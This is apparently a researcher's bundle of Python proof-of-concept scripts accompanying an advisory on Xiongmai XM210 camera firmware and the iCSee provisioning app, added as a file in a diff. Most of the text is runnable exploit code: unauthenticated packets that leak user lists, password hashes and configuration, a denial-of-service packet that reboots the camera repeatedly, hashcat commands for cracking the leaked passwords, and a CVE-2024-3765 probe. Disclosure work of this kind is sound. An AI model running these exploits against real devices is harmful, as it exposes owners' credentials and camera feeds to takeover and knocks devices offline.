@@ -1,0 +1,349 @@
+================================================================================
+  PROOF-OF-CONCEPT SCRIPTS
+  Security Advisory XM210-2026-001
+
+  Multiple Vulnerabilities in Xiongmai IPC_XM210 RT-Thread Firmware V5.06.R02
+  and the iCSee Provisioning Application
+
+  Researcher: Artyom B (aka Raizer96)
+================================================================================
+
+This file combines all proof-of-concept scripts referenced in the advisory PDF
+into a single plain-text document for ease of distribution.
+
+To use any script:
+  1. Copy the relevant block (between the BEGIN/END markers) into a .py file
+  2. Run with Python 3:  python3 <script_name>.py <target_ip>
+
+All scripts use only the Python 3 standard library. No external dependencies.
+
+ETHICAL USE
+  These scripts are provided to enable the vendor and authorized researchers
+  to verify and reproduce the findings on their own test devices. Use against
+  devices you do not own or have explicit written authorization to test is
+  illegal in most jurisdictions and explicitly NOT authorized by this disclosure.
+
+  The DoS PoC (script 3) will reboot the target device. Do not run against
+  production cameras.
+
+TEST ENVIRONMENT
+  Hardware:        IPC_XM210_X2-WR-T_S38
+  SoC:             Xiongmai XM210
+  OS:              RT-Thread RTOS
+  Firmware:        V5.06.R02.000999WP.00000.140f24.0000000 (build 2025-10-11)
+  Provisioning:    iCSee mobile application (com.xm.csee)
+
+CONTENTS
+  1. poc1_user_disclosure.py         - Reproduces Finding 1
+  2. poc2_config_disclosure.py       - Reproduces Finding 2
+  3. poc3_dos.py                     - Reproduces Finding 3 (WARNING: reboots device)
+  4. poc4_icsee_credentials_NOTES.py - Documents Finding 4 observation method
+  5. verify_cve_2024_3765_patched.py - Verifies CVE-2024-3765 patch status
+
+
+================================================================================
+  BEGIN: poc1_user_disclosure.py
+================================================================================
+
+#!/usr/bin/env python3
+"""
+PoC for Finding #1: Pre-authentication user list and password hash disclosure.
+
+Sends a single DVRIP packet (MsgID 1470, Users) with SessionID 0x00000000
+and prints the response. On affected firmware, returns the full user list
+with XM-format password hashes.
+
+Affected: Xiongmai IPC_XM210 series, RT-Thread firmware V5.06.R02 (and likely earlier).
+Vulnerability class: CWE-306 Missing Authentication for Critical Function.
+
+Use against your own test devices only.
+"""
+import socket
+import struct
+import sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "<target>"
+PORT = 34567
+
+if TARGET == "<target>":
+    print("Usage: ./poc1_user_disclosure.py <target_ip>")
+    sys.exit(1)
+
+# DVRIP frame: MsgID 1470 (Users), SessionID 0
+body = b'{"Name":"Users","SessionID":"0x00000000"}\n\x00'
+hdr = struct.pack(
+    "<BBHIIBBHI",
+    0xFF,          # magic
+    0x01,          # version
+    0,             # reserved
+    0,             # session ID (none)
+    0,             # sequence
+    0, 0,          # total/current packet
+    1470,          # MsgID: Users
+    len(body),
+)
+
+s = socket.socket()
+s.settimeout(5)
+s.connect((TARGET, PORT))
+s.send(hdr + body)
+data = s.recv(65536)
+s.close()
+
+print(data[20:].decode(errors="replace"))
+
+================================================================================
+  END: poc1_user_disclosure.py
+================================================================================
+
+
+================================================================================
+  BEGIN: poc2_config_disclosure.py
+================================================================================
+
+#!/usr/bin/env python3
+"""
+PoC for Finding #2: Pre-authentication configuration disclosure on
+DVRIP MsgIDs 1042 (General), 1046 (Camera), 1050 (Storage), 1450 (OPMachine).
+
+Demonstrates that the authentication gap is a class issue affecting
+multiple handlers, not a single-opcode bug. Same root cause as Finding #1.
+
+Affected: Xiongmai IPC_XM210 series, RT-Thread firmware V5.06.R02.
+Vulnerability class: CWE-306 Missing Authentication for Critical Function.
+
+Use against your own test devices only.
+"""
+import socket
+import struct
+import json
+import sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "<target>"
+PORT = 34567
+
+if TARGET == "<target>":
+    print("Usage: ./poc2_config_disclosure.py <target_ip>")
+    sys.exit(1)
+
+OPCODES = [
+    (1042, "General"),
+    (1046, "Camera"),
+    (1050, "Storage"),
+    (1450, "OPMachine"),
+]
+
+for msgid, name in OPCODES:
+    body = (json.dumps({"Name": name, "SessionID": "0x00000000"}) + "\n\x00").encode()
+    hdr = struct.pack(
+        "<BBHIIBBHI", 0xFF, 0x01, 0, 0, 0, 0, 0, msgid, len(body)
+    )
+    s = socket.socket()
+    s.settimeout(5)
+    s.connect((TARGET, PORT))
+    s.send(hdr + body)
+    data = s.recv(65536)
+    s.close()
+
+    print(f"--- MsgID {msgid} ({name}) ---")
+    print(data[20:].decode(errors="replace")[:400])
+    print()
+
+================================================================================
+  END: poc2_config_disclosure.py
+================================================================================
+
+
+================================================================================
+  BEGIN: poc3_dos.py
+================================================================================
+
+#!/usr/bin/env python3
+"""
+PoC for Finding #3: Unauthenticated denial-of-service via malformed DVRIP commands.
+
+Sends a single packet to MsgID 1054 with a malformed body. The handler hangs.
+Within ~30 seconds the device's hardware watchdog fires and the camera reboots.
+Total downtime ~60-90 seconds. Sustainable indefinitely.
+
+Same effect reproduces on MsgIDs 1400, 1410, 1514 with similarly-shaped payloads.
+
+WARNING: This will reboot the target device. Use only on your own test rig.
+
+Affected: Xiongmai IPC_XM210 series, RT-Thread firmware V5.06.R02.
+Vulnerability class: CWE-20 Improper Input Validation / CWE-730 DoS by Reachable Assertion.
+"""
+import socket
+import struct
+import json
+import sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "<target>"
+PORT = 34567
+MSGID = int(sys.argv[2]) if len(sys.argv) > 2 else 1054
+
+if TARGET == "<target>":
+    print("Usage: ./poc3_dos.py <target_ip> [msgid]")
+    print("Default MsgID: 1054. Other affected: 1400, 1410, 1514")
+    sys.exit(1)
+
+print(f"[*] Sending malformed packet to MsgID {MSGID}")
+print(f"[*] Expect handler hang and watchdog reboot within ~30s")
+
+body = (json.dumps({"Name": "System", "SessionID": "0x00000000"}) + "\n\x00").encode()
+hdr = struct.pack(
+    "<BBHIIBBHI", 0xFF, 0x01, 0, 0, 0, 0, 0, MSGID, len(body)
+)
+
+s = socket.socket()
+s.settimeout(3)
+s.connect((TARGET, PORT))
+s.send(hdr + body)
+
+try:
+    resp = s.recv(4096)
+    print(f"[+] Got response: {resp!r}")
+except socket.timeout:
+    print("[*] Handler hung (timeout). Watchdog reboot expected within 30s.")
+
+s.close()
+
+================================================================================
+  END: poc3_dos.py
+================================================================================
+
+
+================================================================================
+  BEGIN: poc4_icsee_credentials_NOTES.py
+================================================================================
+
+#!/usr/bin/env python3
+"""
+PoC for Finding #4: iCSee mobile app generates low-entropy admin credentials.
+
+This finding is observational, not exploitable directly with a script:
+the credentials are generated client-side by the iCSee app during pairing
+and pushed to the device. Confirming the format requires:
+
+  1. Factory-reset the camera
+  2. Pair through the iCSee mobile app
+  3. Observe the auto-generated admin credentials in the app's
+     device-management screen
+  4. Verify the username matches pattern [a-z]{4} and password
+     matches pattern [a-z0-9]{6}
+  5. Confirm the corresponding hash is leaked by Finding #1's PoC
+
+This script demonstrates how, given a leaked hash from Finding #1, the
+6-character password is offline-crackable in seconds.
+
+Affected: iCSee mobile app (com.xm.csee), all current versions observed.
+Vulnerability class: CWE-521 Weak Password Requirements.
+
+The XM hash format is supported by hashcat mode 22401. The 36^6 search
+space (~2.2 * 10^9) is exhaustible in seconds on a modern CPU.
+
+Example hashcat invocation (against a hash recovered via Finding #1):
+
+    hashcat -a 3 -m 22401 <hash> ?l?l?l?l?l?l       # all-lowercase candidate
+    hashcat -a 3 -m 22401 <hash> ?d?d?d?d?d?d       # all-digit candidate
+    hashcat -a 3 -m 22401 <hash> ?h?h?h?h?h?h       # mixed lowercase+digits
+
+Estimated entropy:
+    Username [a-z]{4}      = 26^4   ~  4.6 * 10^5    (~18 bits)
+    Password [a-z0-9]{6}   = 36^6   ~  2.2 * 10^9    (~31 bits)
+
+For comparison, current best practice for IoT device admin credentials is
+>= 75 bits (e.g., 12+ chars from a mixed alphabet, or per-device
+cryptographically-derived secret bound to the device serial).
+"""
+import sys
+
+print(__doc__)
+sys.exit(0)
+
+================================================================================
+  END: poc4_icsee_credentials_NOTES.py
+================================================================================
+
+
+================================================================================
+  BEGIN: verify_cve_2024_3765_patched.py
+================================================================================
+
+#!/usr/bin/env python3
+"""
+Verifier for CVE-2024-3765 patch status.
+
+Sends the exact PoC packet from netsecfish's published advisory for
+CVE-2024-3765 (DVRIP MsgID 1009 access control bypass) and reports
+the response code.
+
+On the test device (firmware V5.06.R02, build 2025-10-11), this returns
+Ret=102 (method unsupported), confirming the vendor patched MsgID 1009.
+
+This is included to demonstrate that the findings in this advisory are
+NOT duplicates of CVE-2024-3765 - they are the same vulnerability class
+on different opcodes (1042, 1046, 1050, 1450, 1470, 1472) that the
+vendor's prior fix did not address.
+
+Reference: https://github.com/netsecfish/xiongmai_incorrect_access_control
+"""
+import socket
+import json
+import sys
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "<target>"
+PORT = 34567
+
+if TARGET == "<target>":
+    print("Usage: ./verify_cve_2024_3765_patched.py <target_ip>")
+    sys.exit(1)
+
+# The exact published packet from netsecfish's PoC repository
+PAYLOAD_HEX = (
+    "ff00000000000000000000000000f103250000007b202252657422203a203130"
+    "302c202253657373696f6e494422203a202230783022207d0a"
+)
+payload = bytes.fromhex(PAYLOAD_HEX)
+
+print(f"[*] Target: {TARGET}:{PORT}")
+print(f"[*] Sending CVE-2024-3765 probe packet (MsgID 1009)")
+
+s = socket.socket()
+s.settimeout(5)
+s.connect((TARGET, PORT))
+s.send(payload)
+resp = s.recv(8192)
+s.close()
+
+if len(resp) < 20:
+    print(f"[-] Short response: {resp!r}")
+    sys.exit(1)
+
+body = resp[20:].rstrip(b"\x00\n")
+print(f"[+] Response: {body.decode(errors='replace')}")
+
+try:
+    j = json.loads(body)
+    ret = j.get("Ret", "?")
+    print(f"\n>>> Ret = {ret}")
+    if ret == 100:
+        print(">>> *** VULNERABLE *** Pre-auth command accepted (NOT patched)")
+    elif ret == 102:
+        print(">>> Method unsupported - CVE-2024-3765 IS PATCHED on this firmware")
+        print(">>> (But class persists on other opcodes - see other PoCs)")
+    elif ret == 203:
+        print(">>> Auth required (this specific packet not vulnerable)")
+    else:
+        print(f">>> Unusual Ret code")
+except json.JSONDecodeError:
+    print(">>> Non-JSON response")
+
+================================================================================
+  END: verify_cve_2024_3765_patched.py
+================================================================================
+
+
+================================================================================
+  END OF PROOF-OF-CONCEPT SCRIPT BUNDLE
+================================================================================
